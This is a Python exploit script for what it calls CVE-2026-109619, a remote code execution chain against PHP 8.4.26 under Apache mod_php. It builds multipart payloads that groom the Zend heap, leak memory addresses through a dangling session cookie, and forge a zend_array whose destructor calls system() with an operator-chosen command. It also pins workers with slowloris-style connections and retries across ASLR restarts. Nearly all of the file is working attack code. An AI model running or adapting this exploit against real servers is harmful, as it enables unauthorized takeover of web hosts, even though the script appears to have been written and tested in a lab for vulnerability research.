#!/usr/bin/env python3
# INDEX: cookie-leak one-shot system() rce | apache | pure | session_start() | build | fresh worker per shot
"""CVE-2026-109619 fully-remote one-shot RCE (Apache mod_php).

Ported from 9bie's dangling-cookie / stale-id chain. disclose_arm/disclose_read
disclose the ZendMM chunk base + libphp base through the cookie over-read;
forge_arm/forge_fire forge a zend_array whose pDestructor is zif_system and fire
system(). Includes the raw-socket transport shims, the big-field calibration
tool and the shot loop. Proven on stock php:8.4.26-apache (prefork mod_php).
"""
import os
import socket
import struct
import subprocess
import sys
import time
import urllib.parse

# put poc/ on sys.path so common.* / primitives.* imports resolve
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common import http_raw as _http_raw  # noqa: E402
from common.docker_compose import compose_restart  # noqa: E402
from common.offsets import load_offsets  # noqa: E402
from primitives.encode.zend_string_forge import pack_zend_string  # noqa: E402
from primitives.encode.zend_array_forge import forge_zend_array  # noqa: E402,F401
from primitives.groom.worker_pin import (  # noqa: E402,F401
    WorkerPin, hold_workers, close_holders)
from primitives.read_leak.leak_parsers import parse_cookie_rce_leak  # noqa: E402
from primitives.oracles.oom_classifier import (  # noqa: E402
    classify as _oomd_classify, extract_m as _oomd_extract_m)


# 9bie's one-shot FULLY-REMOTE chain (no /proc, no docker cp, no gdb) - the port
# of the proven pure/exploit.py onto the stock php:8.4.26-apache image (mod_php
# prefork, 128M, display_errors=Off, sid_length=32, use_only_cookies=1,
# output_buffering=4096). Where the disclosure round above is the zero-knowledge
# round-1 DISCLOSURE differential (chunk-only, lab-pinned through the in-container
# curl), this is the complete chain to system():
#
#   disclose_arm   END-cleanup send_cookie OOM        -> dangling PS(id)    (chunked)
#   disclose_read  stale-id OOB read (0xC8000 window) -> chunk base + libphp (chunked)
#   forge_arm      cheap-OOM nested-file parse        -> dangling PS(http_session_vars)
#   forge_fire     fake zend_reference + fake zend_array @ main+0xF8398,
#       pDestructor = zif_system, arData -> cmd   -> shutdown system(cmd)
#
# disclose_read's groom lifts libphp into the window: 14x G:511 full-chunk floods
# pre-exhaust the id chunk's bins, G:400 under-fills by 111 pages, a final G:511
# caps it, then X:900 nested-array fields drop 900 HashTables into that 111-page
# hole behind the forged-len id; the 0xC8000 OOB read reads their real
# pDestructor == zval_ptr_dtor, so libphp = zdtor - off["zval_ptr_dtor"]. The
# main chunk is the 2 MiB-aligned pointer bucket whose count matches the stable
# 87-pointer fingerprint; libphp - main is gated to 0x1A00000..0x1F00000.
# zif_system = libphp + off["zif_system"] - all three offsets come from
# BUILTIN_OFFSETS["8.4.26-apache"] (load_offsets(version, "apache2handler")).
#
# Transport is 9bie's raw sockets (chunked TE for the OOM producers, plain
# Content-Length for the sprays) - NOT the in-container curl - plus prefork
# worker-pinning (hold workers-1 slowloris POSTs so one child serves the whole
# cross-request sequence). The multipart bodies are byte-identical to the proven
# pure/ artifacts, so COOKIE_RCE_BOUNDARY stays 9bie's "CCCCCCCCCC".
COOKIE_RCE_BOUNDARY = b"C" * 10
COOKIE_RCE_QUERY = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
COOKIE_RCE_LEAK_SPEC = ["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"]
COOKIE_RCE_FAKE_LEN = 0xC8000           # the 800 KiB OOB disclosure window (fake ZSTR_LEN)
COOKIE_RCE_MAIN_BUCKET = 87             # stable count of main-chunk pointers in the window
COOKIE_RCE_S_OFF = 0xF8398              # fake zend_array offset from the main chunk base
COOKIE_RCE_DELTA_MIN, COOKIE_RCE_DELTA_MAX = 0x1A00000, 0x1F00000   # plausible libphp - main

# sid256/16M recalibration knobs (--deterministic):
# the WSL2 labs run memory_limit=16M, session.sid_length=256, not the 9bie
# sid32/128M profile the constants above are pinned to. These are derived
# empirically (gdb on a live 16M/sid256 lab), consumed only under
# --deterministic; with the flag off every byte stays identical to the proven
# 128M chain. Currently seeded with the 128M values pending the gdb derivation.
COOKIE_RCE_S_OFF_SID256 = 0xF8398       # fake zend_array (doff) @ main+off (sid256/16M)
COOKIE_RCE_HSV_OFF_SID256 = 0x7d720     # PS(http_session_vars) @ main+off (sid256/16M)
COOKIE_RCE_BIG_SID256 = 78              # disclose_arm 8000-byte field count for the key-init OOM


def _cookie_rce_sibling(modname):
    """Load a sibling poc/ module (rshutdown_dangle / self_locate) by path.
    Cached; python3 -I safe (no reliance on sys.path)."""
    import importlib.util as _ilu
    cache = _cookie_rce_sibling.__dict__.setdefault("_cache", {})
    if modname not in cache:
        p = os.path.join(_POC_ROOT, "primitives", "groom",
                         modname + ".py")
        spec = _ilu.spec_from_file_location(modname, p)
        mod = _ilu.module_from_spec(spec)
        spec.loader.exec_module(mod)
        cache[modname] = mod
    return cache[modname]


def disclose_arm_body(big=78, parts=860, fillers128=14, burners=20):
    """disclose_arm producer body (byte-exact port of mk_a1.py at the chain's defaults):
    an empty-ish sid (one NUL byte -> the no-id create branch), `parts` depth-64
    nested empty-file fields (indices 0/1 carry short filenames and 103/231-byte
    Content-Types), `fillers128` bin-128 fillers, `big` 8000-byte values,
    `burners` 4000-byte burners and a 4000-byte PHP_SESSION_UPLOAD_PROGRESS. The
    ladder exhausts memory_limit inside END-cleanup php_session_send_cookie, so
    the created sid dangles with send_cookie=1 and no session-file flock.

    parts/fillers128/burners default to the 9bie 128M profile; groom_scaling
    scales them with the target memory_limit (see --memory-limit)."""
    b = COOKIE_RCE_BOUNDARY
    out = bytearray()

    def part(name, value=b"", filename=None, ctype=None):
        out.extend(b"--" + b + b'\r\nContent-Disposition: form-data; name="' +
                   name + b'"')
        if filename is not None:
            out.extend(b'; filename="' + filename + b'"')
        out.extend(b"\r\n")
        if ctype is not None:
            out.extend(b"Content-Type: " + ctype + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    def nest_name(i):
        return (b"files[R%05d" % i) + b"K" * 90 + b"]" + b"[a]" * 62

    part(b"PHPSESSID", bytes.fromhex("00"))
    for i in range(parts):
        # Empty file part: the header's blank line is followed immediately by
        # the next boundary (no body, no CRLF) - the proven 128M OOM shape.
        ctype = (b"C" * 103 if i == 0 else
                 b"C" * 231 if i == 1 else b"application/octet-stream")
        out.extend(b"--" + b + b'\r\nContent-Disposition: form-data; name="' +
                   nest_name(i) + b'"')
        out.extend(b'; filename="A"' if i in (0, 1) else b'; filename=""')
        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")
    for i in range(fillers128):
        part((b"f%04d" % i).ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        part(b"b%04d" % i, b"B" * 8000)
    for i in range(burners):
        part(b"u%02d" % i, b"U" * 4000)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * 4000)
    out.extend(b"--" + b + b"--\r\n")
    return bytes(out)


def _cookie_rce_tag8(idx, tagged):
    return (b"/" + (b"%02d" % (idx % 100)) + b"BBBBB") if tagged else b"BBBB/BBB"


def _cookie_rce_forge_fill(pages, page, fake_len, idx, tagged):
    """A full-chunk 'A' flood (pages*4096-25 bytes) carrying a fake zend_string
    header at chunk+page*0x1000 (the id address): refcount 0 (never freed),
    IS_STRING, len = the OOB window, first data byte '/' so php_session_valid_key
    fails cleanly (9bie's survival path)."""
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= L:
        # refcount 0 -> no free; IS_STRING | not collectable; len = OOB window
        pack_zend_string(v, hdr, fake_len, refcount=0,
                         val=_cookie_rce_tag8(idx, tagged))
    return bytes(v)


def _cookie_rce_forge_value(page, fake_len, idx, tagged):
    """Minimal id-forge value (spec item A): data ends 8 bytes past the fake
    header so the read spills into residual 'A'-era memory of the same chunk."""
    hdr = page * 0x1000 - 0x1018
    v = bytearray(b"A" * (hdr + 0x18 + 8))
    pack_zend_string(v, hdr, fake_len, refcount=0, val=_cookie_rce_tag8(idx, tagged))
    return bytes(v)


def disclose_read_body(spec=COOKIE_RCE_LEAK_SPEC, fake_len=COOKIE_RCE_FAKE_LEN,
                     sid=b"a", progress=b"k0", name_len=120, tag=True):
    """disclose_read consumer body (port of mk_leak_b.py): the stale PS(id) is reclaimed by
    a forged zend_string whose len is `fake_len`, and the spec shapes the id
    chunk so the forward OOB read lands on the X:900 nested-array HashTables (see
    the section header). Spec items: F/S = plain floods, G:<pages>:<page> = a
    full-chunk flood carrying the fake header, X:<n> = n nested-array fields,
    A:<page> = a minimal forge value."""
    b = COOKIE_RCE_BOUNDARY
    out = bytearray()

    def part(name, value):
        out.extend(b"--" + b + b'\r\nContent-Disposition: form-data; name="' +
                   name + b'"\r\n\r\n' + value + b"\r\n")

    part(b"PHPSESSID", sid)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    idx = 0
    for item in spec:
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            v = (b"A" if kind == "F" else b"S") * (int(arg, 0) * 4096 - 25)
        elif kind == "A":
            v = _cookie_rce_forge_value(int(arg, 0), fake_len, idx, tag)
        elif kind == "X":
            for _ in range(int(arg, 0)):
                part((b"x%05d" % idx) + b"[a]" * 12, b"v")
                idx += 1
            continue
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            v = _cookie_rce_forge_fill(int(pages_s, 0), int(page_s, 0),
                                fake_len, idx, tag)
        else:
            raise ValueError(f"bad leak spec item {item!r}")
        part((b"f%04d" % idx).ljust(name_len, b"f")[:name_len], v)
        idx += 1
    out.extend(b"--" + b + b"--\r\n")
    return bytes(out)


def forge_arm_body(parts=880, depth=64, fillers=115, sid=b"a" * 32,
                   progress=b"k0"):
    """forge_arm producer body (port of cheap_oom_a.py at the chain's defaults): sid,
    progress, `fillers` bin-32 short fields, then `parts` depth-`depth` nested
    empty-file fields. The parser OOMs mid-parse (before module RINIT), so the
    bailout leaves PS(http_session_vars) dangling in the chunk for forge_fire."""
    b = COOKIE_RCE_BOUNDARY
    out = bytearray()

    def part(name, value=b""):
        out.extend(b"--" + b + b'\r\nContent-Disposition: form-data; name="' +
                   name + b'"\r\n\r\n' + value + b"\r\n")

    def nest_name(i):
        return (b"files[R%05d]" % i) + b"[a]" * (depth - 2)

    part(b"PHPSESSID", sid)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(fillers):
        part(b"%03d" % i, b"x")
    for i in range(parts):
        out.extend(b"--" + b + b'\r\nContent-Disposition: form-data; name="' +
                   nest_name(i) +
                   b'"; filename=""\r\nContent-Type: application/octet-stream'
                   b"\r\n\r\n")
    out.extend(b"--" + b + b"--\r\n")
    return bytes(out)


def forge_fire_body(S, ht, vl=384, n1=500, n2=495, rc=1, name_len=10,
                        val_type=0x0107, ref_start=8, ref_step=32,
                        sid=b"a" * 32, progress=b"k0"):
    """forge_fire consumer body (port of fake_ref_b.py): n1 spray fields, the `ht`
    field, sid/progress, then n2 spray fields - each spray value planting a fake
    zend_reference (rc, IS_REFERENCE, ptr=S) every 32 bytes so the dangling
    PS(http_session_vars) is reclaimed as a reference to the fake array at S."""
    b = COOKIE_RCE_BOUNDARY

    def fake_ref():
        rv = bytearray(32)                               # zero padding/gc/zval tail
        struct.pack_into("<I", rv, 0, rc)                # refcount
        rv[4] = 0x0A                                     # IS_REFERENCE
        struct.pack_into("<Q", rv, 8, S)                 # ptr -> fake array
        struct.pack_into("<I", rv, 16, val_type)
        return rv

    def spray():
        v = bytearray(b"S" * vl)
        ref, o = fake_ref(), ref_start
        while o + 32 <= vl:
            v[o:o + 32] = ref
            o += ref_step
        return bytes(v)

    def name(prefix, i):
        return (prefix + (b"%09d" % i) + b"x" * name_len)[:name_len]

    sv = spray()
    out = bytearray()

    def part(nm, value):
        out.extend(b"--" + b + b'\r\nContent-Disposition: form-data; name="' +
                   nm + b'"\r\n\r\n' + value + b"\r\n")

    for i in range(n1):
        part(name(b"s", i), sv)
    part(b"ht", ht)
    part(b"PHPSESSID", sid)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(n2):
        part(name(b"t", i), sv)
    out.extend(b"--" + b + b"--\r\n")
    return bytes(out)


# wrappers binding this module's COOKIE_RCE_BOUNDARY to the common.http_raw transport
_raw_sock_exchange = _http_raw._raw_sock_exchange


def send_multipart_chunked(host, port, path, body, timeout, chunk=65536):
    return _http_raw.send_multipart_chunked(host, port, path, body, COOKIE_RCE_BOUNDARY,
                                         timeout, chunk)


def send_multipart_plain(host, port, path, body, timeout):
    return _http_raw.send_multipart_plain(host, port, path, body, COOKIE_RCE_BOUNDARY,
                                       timeout)


def _cookie_rce_tally(tally):
    labels = [("rce", "RCE"), ("fired", "fired(no-svc)"),
              ("b2miss", "leak-but-no-proof"), ("delta", "leak-but-delta-reject"),
              ("clean", "clean-cookie(disclose_arm no dangle)"), ("crash", "disclose_arm crashed worker"),
              ("error", "transport error")]
    total = sum(tally.values())
    print(f"[apache_cookie_rce] tally ({total} shots): " +
          ", ".join(f"{lab}={tally[k]}" for k, lab in labels if tally.get(k)))


def _cookie_rce_calibrate_big(host, port, path, args):
    """Step 1 operator tool: sweep the disclose_arm producer's `big` (8000-byte field
    count) against a display_errors=On lab (oomdisc-apache) and report, per big,
    the 'tried to allocate M' value and the oom_discriminator classification.
    The operator reads off the smallest big whose OOM is 'target-size' (the
    field allocation itself is the straw -> the key-init path) rather than
    'intermediate' (a premature parse-time resize tripped first), and seeds
    COOKIE_RCE_BIG_SID256 with it. classify returns 'blind' when display_errors is Off,
    so --url MUST point at the On lab (oomdisc-apache, default :8100)."""
    cands = ([int(x, 0) for x in args.big_ladder.split(",")] if args.big_ladder
             else [0, 4, 8, 12, 16, 24, 32, 48, 64, 78])
    STRAW = 8000  # the disclose_arm big-field value size classify models as the straw alloc
    print(f"[calibrate] oomdisc sweep {host}:{port}{path} big={cands} "
          f"(straw field L={STRAW}); display_errors MUST be On")
    best = None
    for big in cands:
        resp = send_multipart_chunked(host, port, path + COOKIE_RCE_QUERY,
                                   disclose_arm_body(big, parts=860, fillers128=14,
                                                  burners=20), 180)
        m = _oomd_extract_m(resp)
        category, _, predicted = _oomd_classify(resp, STRAW)
        tail = resp[-140:].decode("latin1", "replace").strip() if resp else ""
        print(f"[calibrate] big={big:<4} M={m} category={category} "
              f"tail={tail!r}")
        if category == "target-size" and best is None:
            best = big
    if best is not None:
        print(f"[calibrate] recommended COOKIE_RCE_BIG_SID256 = {best} "
              f"(smallest big with a target-size OOM)")
    else:
        print("[calibrate] no target-size big in sweep; widen --big-ladder "
              "or confirm display_errors=On")
    return {"recommended_big": best}


def cmd_apache_cookie_rce(args):
    """CVE-2026-109619 fully-remote one-shot: disclose_arm/disclose_read disclose
    chunk+libphp, forge_arm/forge_fire forge the fake zend_array -> system().
    Stock php:8.4.26-apache, 128M, display_errors=Off.

    Reliability is bought with repeated fresh shots crossed with a disclose_arm
    free-page micro-sweep: the knife-edge send_cookie OOM is ASLR-jittery, so each
    shot cycles a --big-ladder value and (with --restart-each) re-rolls ASLR. A
    worker-alive probe after disclose_arm classifies the miss - disclose_arm crashed
    the single child vs. a clean no-dangle cookie - and aborts the shot before the
    33 MB disclose_read on a dead worker. The per-shot outcomes are tallied at the
    end so the dominant failure gate is visible."""
    u = urllib.parse.urlsplit(args.url if "://" in args.url
                              else "http://" + args.url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = args.path
    off = load_offsets(args.version, args.sapi)
    svc = args.service
    determ = getattr(args, "determ", False)

    # --calibrate-big: operator tool (step 1). Sweep disclose_arm field sizing against a
    # display_errors=On lab (oomdisc-apache) and report the field size whose OOM
    # is the field allocation itself (target-size), not a premature intermediate
    # resize. classify returns "blind" when display_errors is Off, so this MUST
    # run against the On lab; the winning size then seeds COOKIE_RCE_BIG_SID256.
    if getattr(args, "calibrate_big", False):
        return _cookie_rce_calibrate_big(host, port, path, args)

    full_cmd = f"{args.cmd} > {args.proof} 2>&1".encode()
    if len(full_cmd) > 0x160 - 0x98:
        raise SystemExit(f"[apache_cookie_rce] command too long ({len(full_cmd)} bytes) "
                         f"for the 384-byte ht carrier")

    # --memory-limit selects a groom-scaling profile (JoasASantos SIZING_PROFILES,
    # ported in groom_scaling.py). When unset, every knob keeps its legacy 128M
    # value so existing invocations are byte-identical. An explicit --big /
    # --fillers / --fake-len still overrides the profile.
    gp = None
    if getattr(args, "memory_limit", None):
        import importlib.util as _ilu
        _gp_path = os.path.join(_POC_ROOT,
                                "primitives", "groom", "groom_scaling.py")
        _spec = _ilu.spec_from_file_location("groom_scaling", _gp_path)
        _gs = _ilu.module_from_spec(_spec)
        _spec.loader.exec_module(_gs)
        gp = _gs.get_groom_profile(args.memory_limit)
        g_disclose_arm_parts = gp["disclose_arm_parts"]
        g_disclose_arm_f128 = gp["disclose_arm_fillers128"]
        g_disclose_arm_burn = gp["disclose_arm_burners"]
        g_forge_arm_parts = gp["forge_arm_parts"]
        g_leak_spec = _gs.leak_spec_for(gp)
        g_s_off = gp["ht_offset"]
        print(f"[apache_cookie_rce] groom profile memory_limit={gp['memory_limit']} "
              f"[{gp['source']}]: disclose_arm(big={gp['disclose_arm_big']},parts={g_disclose_arm_parts},"
              f"f128={g_disclose_arm_f128},burn={g_disclose_arm_burn}) forge_arm(parts={g_forge_arm_parts},"
              f"fillers={gp['forge_arm_fillers']}) fake_len={gp['fake_len']:#x} "
              f"ht_off={g_s_off:#x} gfill={gp['leak_gfill']}")
    else:
        g_disclose_arm_parts, g_disclose_arm_f128, g_disclose_arm_burn = 860, 14, 20
        g_forge_arm_parts = 880
        g_leak_spec = COOKIE_RCE_LEAK_SPEC
        # --deterministic recalibrates the fake-array landing offset to the
        # sid256/16M geometry (only when --memory-limit did not already pin a
        # profile; an explicit profile is the operator's own choice and wins).
        g_s_off = COOKIE_RCE_S_OFF_SID256 if determ else COOKIE_RCE_S_OFF
    if determ:
        print(f"[apache_cookie_rce] --deterministic: sid256/16M path "
              f"(S_off={g_s_off:#x}, self_locate carrier, rshutdown exact-size "
              f"forge_fire reclaim, disclose_arm big default={COOKIE_RCE_BIG_SID256})")

    # Resolve the scalar knobs: an explicit CLI value wins, then the profile,
    # then the legacy default (sid256-calibrated under --deterministic, else 128M).
    def _resolve(cli_val, prof_key, legacy):
        if cli_val is not None:
            return cli_val
        if gp is not None:
            return gp[prof_key]
        return legacy
    r_big = _resolve(args.big, "disclose_arm_big", COOKIE_RCE_BIG_SID256 if determ else 78)
    r_fillers = _resolve(args.fillers, "forge_arm_fillers", 115)
    r_fake_len = _resolve(args.fake_len, "fake_len", COOKIE_RCE_FAKE_LEN)

    ladder = ([int(x, 0) for x in args.big_ladder.split(",")] if args.big_ladder
              else [r_big])

    def exec_in(svc_cmd):
        return subprocess.run(["docker", "compose", "exec", "-T", svc] + svc_cmd,
                              capture_output=True)

    if svc:
        exec_in(["rm", "-f", args.proof])
    print(f"[apache_cookie_rce] target {host}:{port}{path}, workers={args.workers}, "
          f"shots={args.shots}, big-ladder={ladder}, restart-each="
          f"{args.restart_each}, cmd={args.cmd!r} -> {args.proof} "
          f"(zval_ptr_dtor={off['zval_ptr_dtor']:#x}, "
          f"zif_system={off['zif_system']:#x})")
    # Pinning is (re-)established lazily: a container restart tears the pool
    # down and kills any held sockets, so the holders must be opened AFTER each
    # restart, not once up front (the old ordering silently ran every post-
    # restart shot unpinned -> the cross-request dangles scattered across
    # children and the chain could not land on the stock 150-worker pool).
    holders = []
    # --pin-workers > 0 switches on the slowloris WorkerPin (probe-confirmed,
    # release-exactly-one), re-pinned per shot; 0 (default) keeps the legacy
    # hold_workers pin so the single-worker labs (MaxRequestWorkers=1), where
    # slowloris would starve the lone child, behave exactly as before.
    pin = WorkerPin(host, port, args.pin_workers) if args.pin_workers > 0 else None

    tally = {}

    def rec(k):
        tally[k] = tally.get(k, 0) + 1

    try:
        for shot in range(1, args.shots + 1):
            big = ladder[(shot - 1) % len(ladder)]
            # Restart (re-roll ASLR) BEFORE pinning so the holders land on the
            # fresh pool; a restart kills the old holder sockets, so re-pin
            # after every restart. Without a restart, pin the (externally
            # prepared) pool once on shot 1.
            if svc and (args.restart_each or (shot == 1 and args.restart)):
                close_holders(holders)
                if pin:
                    pin.release()
                compose_restart(svc)
            if pin:
                # Re-pin every shot over sockets (restart-safe): saturate the
                # pool, free exactly one child, and run
                # disclose_arm->disclose_read->forge_arm->forge_fire (all
                # Connection: close) against it. release() at shot end.
                if pin.pin_one_free():
                    print(f"[apache_cookie_rce] pinned 1/{args.pin_workers} workers free "
                          f"({len(pin.held)} slowloris holders)")
                else:
                    print(f"[apache_cookie_rce] pool did not saturate at "
                          f"--pin-workers {args.pin_workers} "
                          f"(raise it to the pool size); running this shot unpinned")
            elif svc and (args.restart_each or (shot == 1 and args.restart)):
                holders.extend(hold_workers(host, port, args.workers))
            elif shot == 1 and not holders:
                holders.extend(hold_workers(host, port, args.workers))
            # A keep-alive GET so the producer is not the worker's very first
            # request (startup residue shifts the layout one page).
            try:
                w = socket.create_connection((host, port), timeout=5)
                w.sendall(b"GET " + path.encode() + b" HTTP/1.0\r\nHost: x\r\n\r\n")
                w.recv(1024)
                w.close()
            except OSError:
                pass

            print(f"[apache_cookie_rce][shot {shot}/{args.shots}] disclose_arm (big={big}): "
                  f"END-cleanup send_cookie OOM")
            send_multipart_chunked(host, port, path + COOKIE_RCE_QUERY,
                                disclose_arm_body(big, parts=g_disclose_arm_parts,
                                               fillers128=g_disclose_arm_f128,
                                               burners=g_disclose_arm_burn), 180)
            # NOTHING may run on the worker between disclose_arm and disclose_read: any plain request
            # reruns session RINIT and resets the dangling PS(id), so disclose_read must be
            # the very next request. disclose_read's own response is therefore the miss
            # classifier (a worker-alive probe here would itself wipe the dangle).
            time.sleep(0.2)

            resp = send_multipart_chunked(host, port, path,
                                       disclose_read_body(spec=g_leak_spec,
                                                        fake_len=r_fake_len),
                                       args.timeout)
            try:
                info = parse_cookie_rce_leak(resp, off, determ=determ)
            except ValueError as e:
                if not resp or resp.startswith(b"connect_error") \
                        or "no Set-Cookie" in str(e):
                    print(f"[apache_cookie_rce]   disclose_arm crashed the worker (no cookie); "
                          f"next shot")
                    rec("crash")
                else:
                    print(f"[apache_cookie_rce]   disclose_read clean - disclose_arm did not dangle; next shot")
                    rec("clean")
                continue
            print(f"[apache_cookie_rce]   disclose_read disclosure: decoded={info['decoded']} "
                  f"zval_ptr_dtor={info['zdtor']:#x} -> libphp={info['lib']:#x}")
            if determ and info.get("self_locate"):
                sl = info["self_locate"]
                if sl.get("base") is not None:
                    print(f"[apache_cookie_rce]   self_locate: carrier={sl['base']:#x} "
                          f"votes={sl['votes']} chunk={sl['chunk']:#x} "
                          f"carrier_off={sl['carrier_off']:#x} (expect "
                          f"{off['a_off']:#x})")
                else:
                    print(f"[apache_cookie_rce]   self_locate: sub-quorum "
                          f"(votes={sl['votes']}); using bucket candidates")
            if args.show:
                top = sorted(info["buckets"].items(), key=lambda kv: -kv[1])[:6]
                print(f"[apache_cookie_rce]   chunk buckets: "
                      f"{[(hex(bb), c) for bb, c in top]}")
            cands = info["main_candidates"]
            if determ:
                # Guard the delta gate: a noisy self_locate recovery must not
                # knock out a shot whose bucket candidate is valid. Float any
                # delta-passing candidate to the front so the gate below (which
                # judges cands[0]) never rejects on an implausible first pick.
                passing = [c for c in cands
                           if COOKIE_RCE_DELTA_MIN <= info["lib"] - c <= COOKIE_RCE_DELTA_MAX]
                if passing:
                    cands = passing + [c for c in cands if c not in passing]
            delta = info["lib"] - cands[0] if cands else 0
            if not cands or not (COOKIE_RCE_DELTA_MIN <= delta <= COOKIE_RCE_DELTA_MAX):
                print(f"[apache_cookie_rce]   implausible libphp-main delta {delta:#x}; "
                      f"next shot")
                rec("delta")
                continue

            zif = info["lib"] + off["zif_system"]
            rce_hit = False
            for cand in cands:
                S = cand + g_s_off
                print(f"[apache_cookie_rce][shot {shot}/{args.shots}] forge_arm+forge_fire: "
                      f"main={cand:#x} S={S:#x} zif_system={zif:#x}")
                send_multipart_plain(host, port, path,
                                  forge_arm_body(parts=g_forge_arm_parts,
                                                 fillers=r_fillers),
                                  args.timeout)
                time.sleep(0.2)
                # Step 2 (narrow): keep the proven reclaim body and constants
                # (forge_fire_body: val.u1.type_info=0x0107, ref_start=8) and
                # under --deterministic lift in only rshutdown_dangle's
                # deterministic element: the 7-byte PHP_SESSION_UPLOAD_PROGRESS,
                # whose 7B->32B zend_string lands exact-size in the freed
                # PS(http_session_vars) reference bin. forge_arm (above) is the
                # matching pre-RINIT RSHUTDOWN-skip dangle.
                ht = forge_zend_array(S, zif, full_cmd)
                forge_fire_progress = b"M" * 7 if determ else b"k0"
                send_multipart_plain(host, port, path,
                                  forge_fire_body(S, ht,
                                                      progress=forge_fire_progress),
                                  args.timeout)
                time.sleep(0.6)
                if not svc:
                    continue
                r = exec_in(["cat", args.proof])
                if r.returncode == 0 and r.stdout.strip():
                    print(f"[apache_cookie_rce] RCE OK (shot {shot}, big={big}); "
                          f"{args.proof}:")
                    print(r.stdout.decode("utf-8", "replace").strip())
                    rec("rce")
                    rce_hit = True
                    if not args.measure:
                        _cookie_rce_tally(tally)
                        return {"lib": info["lib"], "main": cand, "S": S,
                                "shot": shot, "proof": r.stdout}
                    exec_in(["rm", "-f", args.proof])
                    break
            if rce_hit:
                continue
            if not svc:
                print("[apache_cookie_rce] chain fired for every candidate (no --service "
                      "to read the proof; use --cmd for an out-of-band callback)")
                rec("fired")
                if not args.measure:
                    _cookie_rce_tally(tally)
                    return {"lib": info["lib"], "main_candidates": cands}
                continue
            print("[apache_cookie_rce]   disclosure landed but no proof; next shot")
            rec("b2miss")
            exec_in(["rm", "-f", args.proof])
        print("[apache_cookie_rce] no shot landed RCE")
        _cookie_rce_tally(tally)
        return None
    finally:
        close_holders(holders)
        if pin:
            pin.release()
